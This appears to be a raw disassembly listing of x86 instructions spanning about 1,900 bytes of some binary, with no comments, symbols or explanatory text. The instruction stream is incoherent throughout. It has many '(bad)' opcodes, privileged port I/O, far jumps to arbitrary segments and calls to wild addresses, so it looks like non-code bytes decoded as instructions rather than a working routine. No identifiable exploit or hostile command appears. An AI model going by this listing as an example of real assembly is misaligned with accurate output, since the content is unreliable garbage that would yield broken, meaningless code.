  41b316:	cmp    ah,BYTE PTR [ecx+0x741d1a12]
  41b31c:	or     eax,0xc01b511
  41b321:	loop   0x41b2a9
  41b323:	xchg   ebp,eax
  41b324:	into   
  41b325:	xchg   ebx,eax
  41b326:	setb   cl
  41b329:	fbstp  TBYTE PTR ds:0xd67865da
  41b32f:	retf   
  41b330:	shl    al,0xae
  41b333:	retf   
  41b334:	mov    ds:0x76c67281,eax
  41b339:	xchg   edi,eax
  41b33a:	add    BYTE PTR [esi+0x5d5d41a5],al
  41b340:	cli    
  41b341:	sbb    cl,BYTE PTR [edi-0x40f18859]
  41b347:	and    dl,al
  41b349:	test   DWORD PTR [esi-0x5ddf8874],eax
  41b34f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b350:	cmp    ebx,DWORD PTR [ebp+0x11]
  41b353:	dec    ecx
  41b354:	sar    DWORD PTR [esi],cl
  41b356:	ret    
  41b357:	cmp    eax,0xccd2eab5
  41b35c:	push   ecx
  41b35d:	mov    bh,0x91
  41b35f:	dec    ebp
  41b360:	xor    al,bl
  41b362:	sbb    BYTE PTR [esi+0x2f816eed],ah
  41b368:	(bad)  
  41b369:	push   0x7a
  41b36b:	gs es push ecx
  41b36e:	sub    al,ah
  41b370:	inc    ecx
  41b371:	xchg   edx,ecx
  41b373:	ins    DWORD PTR es:[edi],dx
  41b374:	pop    ecx
  41b375:	pop    esi
  41b376:	mov    cl,0x74
  41b378:	test   BYTE PTR [ecx],bh
  41b37a:	retf   0x3cd1
  41b37d:	inc    esi
  41b37e:	fs das 
  41b380:	cs test eax,0x1c3546fa
  41b386:	test   eax,0xb82654ce
  41b38b:	mov    ch,0x1a
  41b38d:	and    ecx,DWORD PTR es:[ebx+0x62436599]
  41b394:	retw   0x7123
  41b398:	ja     0x41b3fa
  41b39a:	adc    cl,BYTE PTR [edx]
  41b39c:	cli    
  41b39d:	int    0xe4
  41b39f:	pop    ss
  41b3a0:	jmp    DWORD PTR [ecx]
  41b3a2:	fisubr DWORD PTR [ebp+eax*1-0x4bb1cb8f]
  41b3a9:	aad    0xa2
  41b3ab:	test   BYTE PTR [edi+0x12],bh
  41b3ae:	xchg   edi,eax
  41b3af:	arpl   WORD PTR [ebx+edx*1+0x63a446de],si
  41b3b6:	fsub   st,st(1)
  41b3b8:	mov    esp,0x2826ce57
  41b3bd:	cmp    eax,0x229e39a1
  41b3c2:	cmp    bl,BYTE PTR [ebp+0x3f]
  41b3c5:	ret    
  41b3c6:	xlat   BYTE PTR ds:[ebx]
  41b3c7:	mov    ch,dl
  41b3c9:	mov    dl,0x8d
  41b3cb:	out    0xea,al
  41b3cd:	iret   
  41b3ce:	jo     0x41b3e4
  41b3d0:	jb     0x41b355
  41b3d2:	test   BYTE PTR [ecx+0x7e],bh
  41b3d5:	push   ss
  41b3d6:	cli    
  41b3d7:	aas    
  41b3d8:	mov    eax,esp
  41b3da:	push   eax
  41b3db:	mov    ebp,0x1e30d5f4
  41b3e0:	loop   0x41b36c
  41b3e2:	loope  0x41b3e0
  41b3e4:	test   DWORD PTR [edx-0x6b23fc4e],0x91777864
  41b3ee:	mov    ebx,0x2c187b22
  41b3f3:	cmp    cl,BYTE PTR [ecx+0x39]
  41b3f6:	xchg   ebp,eax
  41b3f7:	mov    ecx,0xbe36cca3
  41b3fc:	ficom  WORD PTR [edi+0x16]
  41b3ff:	(bad)
  41b403:	inc    edx
  41b404:	call   esp
  41b406:	les    edi,FWORD PTR [ecx]
  41b408:	inc    edx
  41b409:	fsubr  QWORD PTR [eax+0x511caccc]
  41b40f:	nop
  41b410:	out    0x20,al
  41b412:	out    0x39,al
  41b414:	pop    ds
  41b415:	jp     0x41b404
  41b417:	push   esi
  41b418:	jmp    0x41b46d
  41b41a:	add    BYTE PTR [edi-0x9],0xe5
  41b41e:	cmp    BYTE PTR [esi+ebx*2-0x2174aea9],dl
  41b425:	lea    ebx,[edi-0x40]
  41b428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b429:	jno    0x41b3eb
  41b42b:	rcr    BYTE PTR [ecx+0x5bf876ec],1
  41b431:	retf   
  41b432:	or     DWORD PTR [edi],0xffffff87
  41b435:	push   es
  41b436:	pushf  
  41b437:	cwde   
  41b438:	mov    dx,sp
  41b43b:	push   edx
  41b43c:	ror    DWORD PTR [eax-0x76],1
  41b43f:	into   
  41b440:	adc    DWORD PTR [eax-0x22],ebx
  41b443:	xor    al,0x60
  41b445:	push   0x5c
  41b447:	cwde   
  41b448:	(bad)  
  41b449:	add    BYTE PTR [edi-0x3e5a8341],ah
  41b44f:	cmp    edi,edi
  41b451:	mov    edi,0x64ed4661
  41b456:	mov    cl,BYTE PTR [edi]
  41b458:	stos   DWORD PTR es:[edi],eax
  41b459:	mov    al,0xe
  41b45b:	pop    ebx
  41b45c:	xchg   ebx,eax
  41b45d:	cmp    ah,ch
  41b45f:	in     al,dx
  41b460:	sahf   
  41b461:	xchg   BYTE PTR [edi+0x66],bl
  41b464:	cmp    BYTE PTR [edx+ebp*2],ch
  41b467:	ins    BYTE PTR es:[edi],dx
  41b468:	out    0x51,al
  41b46a:	lea    ebp,[ecx+esi*4+0x57]
  41b46e:	sbb    DWORD PTR [ecx],ebx
  41b470:	arpl   WORD PTR [edi],si
  41b472:	push   ss
  41b473:	xor    al,0x98
  41b476:	lock sub dh,BYTE PTR [ebx+0x28d8066c]
  41b47d:	scas   eax,DWORD PTR es:[edi]
  41b47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b47f:	pop    edx
  41b480:	mov    edx,0x94a798c4
  41b485:	lea    esp,[ebp-0x57]
  41b488:	outs   dx,BYTE PTR ds:[esi]
  41b489:	xchg   edx,eax
  41b48a:	pop    ds
  41b48b:	pushf  
  41b48c:	adc    ecx,esi
  41b48e:	xchg   ebp,eax
  41b48f:	(bad)  
  41b491:	xchg   esp,eax
  41b492:	mov    ss,esp
  41b494:	xor    DWORD PTR [ebp-0x4e],ebp
  41b497:	jb     0x41b4e8
  41b499:	add    edi,ecx
  41b49b:	pop    edi
  41b49c:	xor    esp,DWORD PTR [ebx-0x7f]
  41b49f:	push   ecx
  41b4a0:	pop    edx
  41b4a1:	test   al,0xd6
  41b4a3:	fmul   QWORD PTR [edx+0x5fad3fbb]
  41b4a9:	pop    edx
  41b4aa:	sbb    DWORD PTR [eax+0x1c257bab],ebx
  41b4b0:	sbb    dh,bh
  41b4b2:	mov    ecx,0x6be62a2b
  41b4b7:	stc    
  41b4b8:	and    al,0xdb
  41b4ba:	cwde   
  41b4bb:	fmul   DWORD PTR [esi-0x20]
  41b4be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4bf:	adc    al,BYTE PTR ds:0xb17a40cb
  41b4c5:	xor    edi,DWORD PTR [edx+edx*4-0x3a]
  41b4c9:	xchg   BYTE PTR [eax],cl
  41b4cb:	push   es
  41b4cc:	xor    al,0xdd
  41b4ce:	mov    ch,0xdf
  41b4d0:	and    eax,0x6f87a38e
  41b4d5:	cmp    al,0x23
  41b4d7:	jb     0x41b497
  41b4d9:	sahf   
  41b4da:	pop    esi
  41b4db:	stos   BYTE PTR es:[edi],al
  41b4dc:	cli    
  41b4dd:	add    edi,esp
  41b4df:	adc    edx,esp
  41b4e1:	xor    edi,DWORD PTR ds:0xbc357b37
  41b4e7:	push   ds
  41b4e8:	pop    es
  41b4e9:	addr16 int3 
  41b4eb:	or     ch,ah
  41b4ed:	mov    ah,0xe4
  41b4ef:	sbb    DWORD PTR [edi+0x15029cab],ebx
  41b4f5:	(bad)  
  41b4f6:	pop    ebx
  41b4f7:	repz xor dh,cl
  41b4fa:	or     esi,DWORD PTR [edx-0x71074bbf]
  41b500:	jge    0x41b574
  41b502:	jl     0x41b55f
  41b504:	xchg   ecx,eax
  41b505:	les    edi,FWORD PTR [esi+0x73527425]
  41b50b:	aam    0x24
  41b50d:	inc    ecx
  41b50e:	and    edx,eax
  41b510:	clc    
  41b511:	xchg   edx,eax
  41b512:	dec    ebp
  41b513:	jg     0x41b52c
  41b515:	jmp    0xfc45:0x21e5d8ae
  41b51c:	into   
  41b51d:	xor    BYTE PTR [ecx+0x7dfaeab8],bl
  41b523:	ins    BYTE PTR es:[edi],dx
  41b524:	mov    cl,dl
  41b526:	dec    edx
  41b527:	cmp    BYTE PTR [eax],bh
  41b529:	aaa    
  41b52a:	or     DWORD PTR [ecx+edi*4-0x7f],ecx
  41b52e:	adc    edi,esi
  41b530:	sub    ch,BYTE PTR [edx-0x6123079e]
  41b536:	ja     0x41b5a1
  41b538:	aas    
  41b539:	jnp    0x41b516
  41b53b:	(bad)  
  41b53c:	out    0x70,al
  41b53e:	outs   dx,DWORD PTR ds:[esi]
  41b53f:	mov    ds,WORD PTR [ebp+0x54860ad3]
  41b545:	inc    ebp
  41b546:	sub    bl,BYTE PTR fs:[edi+0x49]
  41b54a:	ja     0x41b5b4
  41b54c:	jb     0x41b52d
  41b54e:	daa    
  41b54f:	div    BYTE PTR [ebx]
  41b551:	mov    eax,DWORD PTR [ebx]
  41b553:	gs repnz mov esi,0x95737dae
  41b55a:	imul   edx,ebx,0x3a
  41b55d:	(bad)  
  41b55f:	mov    eax,ds:0xcc78a7e9
  41b564:	xchg   DWORD PTR [eax-0x2],ebp
  41b567:	or     edx,edi
  41b569:	mov    al,0x95
  41b56b:	sbb    DWORD PTR [eax],ebx
  41b56d:	mov    BYTE PTR [esi-0xe],bl
  41b570:	and    DWORD PTR [edx+0x59],edi
  41b573:	stos   BYTE PTR es:[edi],al
  41b574:	cmp    ebp,esp
  41b576:	clc    
  41b577:	fmul   DWORD PTR [edx+0x3fdbe912]
  41b57d:	xchg   ecx,eax
  41b57e:	mov    ah,0xa0
  41b580:	push   edx
  41b581:	mov    cl,BYTE PTR [edi-0x7f]
  41b584:	cmp    BYTE PTR [esi],al
  41b586:	mov    esp,0x87c2eddb
  41b58b:	dec    ebx
  41b58c:	sbb    DWORD PTR [edi-0x110e221d],esi
  41b592:	dec    eax
  41b593:	ins    BYTE PTR es:[edi],dx
  41b594:	pushf  
  41b595:	xchg   esi,eax
  41b596:	sbb    DWORD PTR [eax],0x1a
  41b599:	call   0x262efc4
  41b59e:	jmp    0x362e:0xdb554235
  41b5a5:	das    
  41b5a6:	aam    0xed
  41b5a8:	in     eax,dx
  41b5a9:	bound  esp,QWORD PTR [esi+0x9]
  41b5ac:	call   0xc7ce6ad3
  41b5b1:	(bad)  
  41b5b2:	jnp    0x41b586
  41b5b4:	or     al,0x39
  41b5b6:	push   0x6b0821c1
  41b5bb:	fcmovnb st,st(1)
  41b5bd:	inc    eax
  41b5be:	mov    ebx,DWORD PTR [eax]
  41b5c0:	mov    ds:0x55482a03,eax
  41b5c5:	adc    esp,0x45
  41b5c8:	ds add eax,0xd764fab7
  41b5ce:	and    DWORD PTR [edi],edi
  41b5d0:	xchg   esp,eax
  41b5d1:	sub    al,0x5d
  41b5d3:	ret    
  41b5d4:	mov    eax,ds:0xe679501e
  41b5d9:	(bad)  
  41b5da:	jge    0x41b5f6
  41b5dc:	mov    ah,0xcf
  41b5de:	mov    esi,0xae5a4b91
  41b5e3:	inc    edx
  41b5e4:	jnp    0x41b642
  41b5e6:	mov    ecx,0x44d8eb98
  41b5eb:	ins    DWORD PTR es:[edi],dx
  41b5ec:	rol    BYTE PTR [edx+ebx*8],1
  41b5ef:	addr16 dec eax
  41b5f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f2:	ret    0x895a
  41b5f5:	and    dh,dh
  41b5f7:	jb     0x41b628
  41b5f9:	inc    ecx
  41b5fa:	(bad)  
  41b5fc:	xchg   ecx,eax
  41b5fd:	jae    0x41b64d
  41b5ff:	ficom  DWORD PTR [edi]
  41b601:	or     eax,0x5afff3d3
  41b606:	pop    ebp
  41b607:	inc    ecx
  41b608:	jmp    0x3a4f:0x809587bb
  41b60f:	pop    esp
  41b610:	out    0x53,eax
  41b612:	fmul   QWORD PTR ds:0x3466d8c4
  41b618:	je     0x41b5a2
  41b61a:	or     eax,DWORD PTR [ebp+0x5c19bdf3]
  41b620:	in     al,dx
  41b621:	fist   DWORD PTR [ebx-0x7b0d4a51]
  41b627:	fidiv  WORD PTR [edi-0x79d1b490]
  41b62d:	pop    edx
  41b62e:	gs or  al,0xe5
  41b631:	out    dx,al
  41b632:	out    dx,eax
  41b633:	sbb    esp,DWORD PTR [edi-0x22]
  41b636:	daa    
  41b637:	fdiv   DWORD PTR [esi]
  41b639:	in     eax,0xd6
  41b63b:	or     al,0x86
  41b63d:	pop    edi
  41b63e:	arpl   WORD PTR [ebx+0x68f17743],si
  41b644:	cmp    eax,0x155dc128
  41b649:	inc    edx
  41b64b:	add    ebp,DWORD PTR [eax-0x4cdce88e]
  41b651:	clc    
  41b652:	push   es
  41b653:	mov    ds:0x496a1c4d,al
  41b658:	ins    BYTE PTR es:[edi],dx
  41b659:	ins    DWORD PTR es:[edi],dx
  41b65a:	mov    dl,0x50
  41b65c:	pop    ds
  41b65d:	inc    ebx
  41b65e:	ror    DWORD PTR [ebx-0x3f],0x40
  41b662:	dec    esp
  41b663:	pop    edi
  41b664:	outs   dx,DWORD PTR ds:[esi]
  41b665:	scas   al,BYTE PTR es:[edi]
  41b666:	mov    bl,0x2d
  41b668:	add    eax,DWORD PTR [esi+0x61be6fe3]
  41b66e:	dec    esp
  41b66f:	mov    edi,ebx
  41b671:	and    eax,0x34b529d7
  41b676:	outs   dx,BYTE PTR ds:[esi]
  41b677:	push   ds
  41b678:	and    ecx,ecx
  41b67a:	sbb    dh,dl
  41b67c:	stos   DWORD PTR es:[edi],eax
  41b67d:	pop    esi
  41b67e:	fld    DWORD PTR [edi-0x78f87294]
  41b684:	mov    dh,0xb0
  41b686:	mov    ebp,0xbe3aac00
  41b68b:	das    
  41b68c:	ret    0xd977
  41b68f:	dec    edx
  41b690:	or     DWORD PTR [edx+0x71],edx
  41b693:	imul   ebp,ecx,0x2bfeb5e5
  41b699:	mov    eax,ds:0x5de9e6e
  41b69e:	add    eax,0x55c4c6d2
  41b6a3:	jbe    0x41b6dc
  41b6a5:	lahf   
  41b6a6:	lock loope 0x41b71e
  41b6a9:	jmp    0x42ff:0x15082df7
  41b6b0:	rcr    DWORD PTR [edx-0x966760f],1
  41b6b6:	sti    
  41b6b7:	adc    eax,edi
  41b6b9:	mov    bh,0x2c
  41b6bb:	push   cs
  41b6bc:	xor    DWORD PTR [edi-0x24],ecx
  41b6bf:	pop    esi
  41b6c0:	cmc    
  41b6c1:	out    0x84,eax
  41b6c3:	mov    ds:0x87b641e7,al
  41b6c8:	ins    BYTE PTR es:[edi],dx
  41b6c9:	shr    DWORD PTR [edx+0x13f13062],1
  41b6cf:	xchg   edi,eax
  41b6d0:	fcomp  QWORD PTR [edx+0x6359fc87]
  41b6d6:	gs retf 0x5a77
  41b6da:	xchg   esi,eax
  41b6db:	xchg   DWORD PTR ds:0xf8900ebd,ebp
  41b6e1:	xlat   BYTE PTR ds:[ebx]
  41b6e2:	push   ds
  41b6e3:	es cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41b6e6:	aam    0xed
  41b6e8:	ret    
  41b6e9:	test   BYTE PTR [ecx-0xd276624],al
  41b6ef:	(bad)  
  41b6f0:	cdq    
  41b6f1:	or     BYTE PTR [ebp+edx*2-0x57],cl
  41b6f5:	shr    DWORD PTR [edi],cl
  41b6f7:	imul   ebx,DWORD PTR [eax-0x41aecced],0x40
  41b6fe:	jbe    0x41b779
  41b700:	dec    ebx
  41b701:	adc    eax,0x819dd5cb
  41b706:	push   cs
  41b707:	mov    dl,0xe5
  41b709:	sub    ebx,edi
  41b70b:	ss jmp 0x7316:0x9d4a118d
  41b713:	fisubr WORD PTR [ebx]
  41b715:	sbb    bl,BYTE PTR [esi+0x22]
  41b718:	mov    ah,0x15
  41b71a:	cs outs dx,BYTE PTR cs:[esi]
  41b71d:	gs inc esi
  41b71f:	test   eax,0x7486d3d9
  41b724:	cmp    eax,0x8c8b04e4
  41b729:	inc    esi
  41b72a:	dec    edx
  41b72b:	xchg   DWORD PTR [edx],ecx
  41b72d:	ror    DWORD PTR [ebx-0x36],cl
  41b730:	stc    
  41b731:	inc    ebp
  41b732:	add    eax,0x3075fd56
  41b737:	aam    0xf3
  41b739:	data16 sub al,0xb2
  41b73c:	jge    0x41b776
  41b73e:	pop    eax
  41b73f:	xor    ah,BYTE PTR ds:0xc569c9eb
  41b745:	pop    es
  41b746:	push   ebx
  41b747:	xchg   ebp,eax
  41b748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b749:	xchg   edx,eax
  41b74a:	sub    BYTE PTR [ecx-0x49b8ef54],bh
  41b750:	mov    bh,0x74
  41b752:	rol    BYTE PTR [edx+0x5e],0x5
  41b756:	mov    al,0x3f
  41b758:	dec    edi
  41b759:	pop    edi
  41b75a:	xlat   BYTE PTR ds:[ebx]
  41b75b:	pop    ecx
  41b75c:	bound  ebx,QWORD PTR [edi]
  41b75e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b75f:	mov    dh,0xe0
  41b761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b762:	pop    edx
  41b763:	out    0xab,eax
  41b765:	dec    esp
  41b766:	mov    ah,0x4a
  41b768:	dec    edi
  41b769:	imul   esi,eax,0x7c
  41b76c:	cmc    
  41b76d:	cmp    eax,0xc25f300f
  41b772:	(bad)  
  41b774:	adc    bh,0x42
  41b777:	loope  0x41b70d
  41b779:	mov    al,0xca
  41b77b:	arpl   WORD PTR ds:0x37f3f4ad,dx
  41b781:	mov    ah,0x5e
  41b783:	dec    edx
  41b784:	mov    cl,0xee
  41b786:	das    
  41b787:	sahf   
  41b788:	jmp    0x9969bda6
  41b78d:	xor    BYTE PTR [ebp+0x7b1d734],dh
  41b793:	jne    0x41b7ae
  41b795:	test   DWORD PTR [ebp+0x25],edx
  41b798:	cld    
  41b799:	stos   BYTE PTR es:[edi],al
  41b79a:	popa   
  41b79b:	repz push eax
  41b79d:	nop
  41b79e:	imul   ebx,DWORD PTR [edx-0x75709645],0xc3b7fdce
  41b7a8:	adc    DWORD PTR [ecx+ebx*1-0x2],0x5b691659
  41b7b0:	jae    0x41b824
  41b7b2:	stos   BYTE PTR es:[edi],al
  41b7b3:	in     eax,0xbd
  41b7b5:	lock pop ebx
  41b7b7:	and    dh,BYTE PTR [eax-0x27a4537e]
  41b7bd:	aas    
  41b7be:	lods   eax,DWORD PTR ds:[esi]
  41b7bf:	mov    WORD PTR [ebx],gs
  41b7c1:	push   ss
  41b7c2:	daa    
  41b7c3:	dec    ecx
  41b7c4:	inc    edx
  41b7c5:	es iret 
  41b7c7:	dec    ebx
  41b7c8:	arpl   WORD PTR [ebx-0x48af138d],bx
  41b7ce:	mov    ecx,0xa72cbd1
  41b7d3:	int    0xc0
  41b7d5:	retf   
  41b7d6:	sub    DWORD PTR [eax],ebp
  41b7d8:	jle    0x41b7da
  41b7da:	repnz sub DWORD PTR [ebp+0x2011dc3b],esi
  41b7e1:	jecxz  0x41b772
  41b7e3:	mov    ebx,0xc2c7324d
  41b7e8:	xchg   ebx,eax
  41b7e9:	imul   edi,ecx,0xffffffda
  41b7ec:	stc    
  41b7ed:	mov    ch,0xf9
  41b7ef:	jbe    0x41b84a
  41b7f1:	inc    ebx
  41b7f2:	arpl   WORD PTR [ebp-0x7d],sp
  41b7f5:	pop    ecx
  41b7f6:	lds    eax,FWORD PTR [ebx+0x66255c55]
  41b7fc:	push   ss
  41b7fd:	dec    ebp
  41b7fe:	add    al,0xf8
  41b800:	mov    esi,fs
  41b802:	jmp    0x41b7ec
  41b804:	aaa    
  41b805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b806:	xlat   BYTE PTR ds:[ebx]
  41b807:	xchg   ebp,eax
  41b808:	fistp  QWORD PTR [esi+ebx*4+0x5aa2c855]
  41b80f:	sub    al,0xb1
  41b811:	(bad)  
  41b813:	sub    ah,BYTE PTR [edx+0x5a]
  41b816:	push   ebx
  41b817:	stos   DWORD PTR es:[edi],eax
  41b818:	jno    0x41b841
  41b81a:	mov    ebx,0x66702d96
  41b81f:	popa   
  41b820:	mov    dh,0xa9
  41b822:	sub    eax,0x8356ef64
  41b827:	sub    BYTE PTR [edi-0x7949fc88],al
  41b82d:	sti    
  41b82e:	dec    ecx
  41b82f:	fild   QWORD PTR [edx-0x80]
  41b832:	mov    cl,BYTE PTR [ecx]
  41b834:	pop    ds
  41b835:	add    ah,BYTE PTR [ebx]
  41b837:	ret    0x912c
  41b83a:	lods   eax,DWORD PTR ds:[esi]
  41b83b:	sti    
  41b83c:	call   0xf61c5c11
  41b841:	sbb    bh,ah
  41b843:	sub    DWORD PTR [esi+0x33],ebx
  41b846:	mov    eax,0x787bfafe
  41b84b:	push   eax
  41b84c:	mov    edx,DWORD PTR [esi+ebx*1]
  41b84f:	jmp    0xe2b40b62
  41b854:	mov    esi,0xb56de8e1
  41b859:	in     al,dx
  41b85a:	jne    0x41b7f9
  41b85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b85d:	xchg   ebx,eax
  41b85e:	ins    DWORD PTR es:[edi],dx
  41b85f:	mov    ecx,0xd0bbcaa0
  41b864:	mov    ds:0x737afc22,eax
  41b869:	and    esi,edi
  41b86b:	cdq    
  41b86c:	and    DWORD PTR [ecx+0x38],edi
  41b86f:	loope  0x41b862
  41b871:	lods   al,BYTE PTR ds:[esi]
  41b872:	pop    ss
  41b873:	cdq    
  41b874:	jle    0x41b880
  41b876:	jecxz  0x41b7fb
  41b878:	xor    bh,BYTE PTR [ebp-0x7bbd9c11]
  41b87e:	sbb    ebx,DWORD PTR [ebp*2-0x7aac968f]
  41b885:	loopne 0x41b8e9
  41b887:	xchg   esi,eax
  41b888:	add    al,0x77
  41b88a:	and    dh,BYTE PTR [ebx-0x1f24b311]
  41b890:	push   ebx
  41b891:	add    bl,BYTE PTR [eax+0x39]
  41b894:	wbinvd 
  41b896:	xor    BYTE PTR ds:0xbf8c6fb9,al
  41b89c:	(bad)  
  41b89d:	pop    ebx
  41b89e:	add    eax,0x10cb574b
  41b8a3:	mov    ds:0x5863df67,al
  41b8a8:	cdq    
  41b8a9:	jecxz  0x41b838
  41b8ab:	or     BYTE PTR [ebx],al
  41b8ad:	xor    al,0xca
  41b8af:	push   ebx
  41b8b0:	and    al,0x8f
  41b8b2:	sbb    esp,DWORD PTR [ebp+eiz*8-0x2b]
  41b8b6:	daa    
  41b8b7:	icebp  
  41b8b8:	aad    0xf5
  41b8ba:	les    edi,FWORD PTR [edx-0xf49a08a]
  41b8c0:	ret    
  41b8c1:	sbb    BYTE PTR [eax+0x143e5a7f],bh
  41b8c7:	mul    BYTE PTR [edx-0x31286ad6]
  41b8cd:	adc    BYTE PTR [ecx],ah
  41b8cf:	mov    gs,WORD PTR [eax-0x332804c8]
  41b8d5:	dec    ebp
  41b8d6:	jae    0x41b8ab
  41b8d8:	pop    esi
  41b8d9:	inc    ebx
  41b8da:	push   ecx
  41b8db:	daa    
  41b8dc:	out    dx,al
  41b8dd:	mov    ebx,0xc314b8fc
  41b8e2:	in     eax,dx
  41b8e3:	xor    esi,esp
  41b8e5:	mov    ch,0xf5
  41b8e7:	jle    0x41b8ed
  41b8e9:	and    al,0x33
  41b8eb:	cwde   
  41b8ec:	push   0xffffffb9
  41b8ee:	sbb    al,0x0
  41b8f0:	(bad)  
  41b8f1:	mov    bh,0x44
  41b8f3:	mov    cl,0x62
  41b8f5:	pop    eax
  41b8f6:	stc    
  41b8f7:	cmp    ebp,esp
  41b8f9:	and    eax,0x1b1edb8
  41b8fe:	jnp    0x41b8c5
  41b900:	popa   
  41b901:	mov    eax,ds:0xef98f1a2
  41b906:	retf   
  41b907:	test   al,0xe5
  41b909:	icebp  
  41b90a:	pop    ecx
  41b90b:	mov    ebp,0xfcd646e2
  41b910:	sbb    ebp,DWORD PTR [esi+0x5ef1fd6]
  41b916:	push   es
  41b917:	and    ebp,ebp
  41b919:	(bad)  
  41b91a:	out    0xf9,eax
  41b91c:	sub    DWORD PTR [edx],0x1d
  41b91f:	adc    esp,DWORD PTR [ecx+0x7f]
  41b922:	int3   
  41b923:	div    BYTE PTR [esp+edx*8]
  41b926:	mov    ebx,0xbb498b15
  41b92b:	jo     0x41b92a
  41b92d:	push   esp
  41b92e:	push   edx
  41b92f:	fwait
  41b930:	mov    eax,0x3054696a
  41b935:	ins    DWORD PTR es:[edi],dx
  41b936:	cdq    
  41b937:	adc    eax,0xc1156042
  41b93c:	add    BYTE PTR cs:[ebp+0x772500fc],dh
  41b943:	fwait
  41b944:	sbb    DWORD PTR [eax-0x36c4c92c],0xc1282ed5
  41b94e:	mov    ecx,0x7b07655
  41b953:	inc    edi
  41b954:	and    DWORD PTR [edx+edx*1-0x1],ecx
  41b958:	cmp    eax,0xe41e9098
  41b95d:	add    dl,cl
  41b95f:	dec    esp
  41b960:	mov    eax,cs:0x2afbe7b
  41b966:	scas   eax,DWORD PTR es:[edi]
  41b967:	mov    bh,0xaf
  41b969:	test   al,0x2b
  41b96b:	mov    cs,WORD PTR [ebx]
  41b96d:	mov    eax,ds:0xe2d5b8a5
  41b972:	push   eax
  41b973:	aas    
  41b974:	pop    DWORD PTR [esi]
  41b976:	(bad)  
  41b977:	xor    BYTE PTR [edx+edi*8],al
  41b97a:	pop    ss
  41b97b:	fiadd  DWORD PTR [esi-0x1c646967]
  41b981:	and    al,0x21
  41b983:	aam    0xf3
  41b985:	sub    al,0xde
  41b987:	fcmovne st,st(5)
  41b989:	ds sub al,0xb
  41b98c:	mov    ds:0x5dd10865,eax
  41b991:	and    eax,0x11f58cba
  41b996:	out    0xf5,al
  41b998:	ins    BYTE PTR es:[edi],dx
  41b999:	mov    al,0x8d
  41b99b:	jle    0x41b9bd
  41b99d:	sahf   
  41b99e:	ss inc ecx
  41b9a0:	test   ebx,0xe951a1c5
  41b9a6:	out    0xe1,al
  41b9a8:	push   eax
  41b9a9:	jge    0x41ba22
  41b9ab:	mov    ebp,DWORD PTR [ebp+edx*2-0x691e9f63]
  41b9b2:	lods   al,BYTE PTR ds:[esi]
  41b9b3:	jmp    0x1d9a6f3a
  41b9b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9b9:	xor    eax,0x3e511a81
  41b9be:	ret    0x76ce
  41b9c1:	xchg   edi,eax
  41b9c2:	inc    ebp
  41b9c3:	pop    cx
  41b9c5:	inc    ebp
  41b9c6:	outs   dx,DWORD PTR ds:[esi]
  41b9c7:	and    BYTE PTR ds:0xffbfd14d,ah
  41b9cd:	lods   eax,DWORD PTR ds:[esi]
  41b9ce:	jge    0x41b98d
  41b9d0:	and    DWORD PTR [eax+0x36a52137],esp
  41b9d6:	fwait
  41b9d7:	cdq    
  41b9d8:	shl    BYTE PTR [ecx-0x1a],0x46
  41b9dc:	hlt    
  41b9dd:	out    dx,al
  41b9de:	lds    ebp,FWORD PTR ds:0xff4cdb63
  41b9e4:	add    bh,cl
  41b9e6:	jp     0x41ba28
  41b9e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9e9:	mov    bl,0xd7
  41b9eb:	mov    edx,0x3e8c1314
  41b9f0:	adc    DWORD PTR [esi-0x5b20d093],ebx
  41b9f6:	call   0xc18477ba
  41b9fb:	fldcw  WORD PTR [eax-0x78]
  41b9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9ff:	std    
  41ba00:	pop    ebx
  41ba01:	push   0x6189e3af
  41ba06:	mov    al,ds:0x16ba03d1
  41ba0b:	test   DWORD PTR [esi+esi*8],esi
  41ba0e:	mov    ds:0x3b833e13,eax
  41ba13:	dec    esi
  41ba14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba15:	cwde   
  41ba16:	call   0xad2a8f4a
  41ba1b:	push   es
  41ba1c:	push   ebx
  41ba1e:	sub    ah,BYTE PTR [eax+0x1979805a]
  41ba24:	ins    DWORD PTR es:[edi],dx
  41ba25:	or     DWORD PTR [eax+0x44],eax
  41ba28:	cdq    
  41ba29:	xchg   esp,eax
  41ba2a:	iret   
  41ba2b:	mov    ss,WORD PTR [ecx]
  41ba2d:	xchg   edx,eax
  41ba2e:	push   esp
  41ba2f:	ja     0x41ba33
  41ba31:	(bad)  [ecx-0x5f9e6b75]
  41ba37:	push   edx
  41ba38:	dec    ecx
  41ba39:	add    eax,0xde0b5fe3
  41ba3e:	scas   eax,DWORD PTR es:[edi]
  41ba3f:	add    dh,dl
  41ba41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba42:	cld    
  41ba43:	xchg   ecx,eax
  41ba44:	fnstenv [eax+ebp*2+0x437c0520]
  41ba4b:	mov    cl,0x87
  41ba4d:	fdivr  st(4),st
  41ba4f:	fsubr  DWORD PTR [edi+0x34]
  41ba52:	xchg   ebp,eax
  41ba53:	adc    dl,dl
  41ba55:	ja     0x41ba56
  41ba57:	gs dec edx
  41ba59:	cmp    al,0x7
  41ba5b:	inc    eax
  41ba5c:	push   0xe604371b
  41ba61:	dec    eax
  41ba62:	mov    ah,0x18
  41ba64:	pop    edx
  41ba65:	and    al,0x6e
  41ba67:	and    BYTE PTR [edx],0x2
  41ba6a:	push   ebx
  41ba6b:	std    
  41ba6c:	rol    BYTE PTR [ecx+0x6f],cl
  41ba6f:	ins    BYTE PTR es:[edi],dx
  41ba70:	rol    DWORD PTR [ecx-0x52f0ad15],1
  41ba76:	int3   
  41ba77:	jmp    0xf5d1:0xd93cc671
  41ba7e:	out    0x58,eax
  41ba80:	or     eax,0x57fc018c
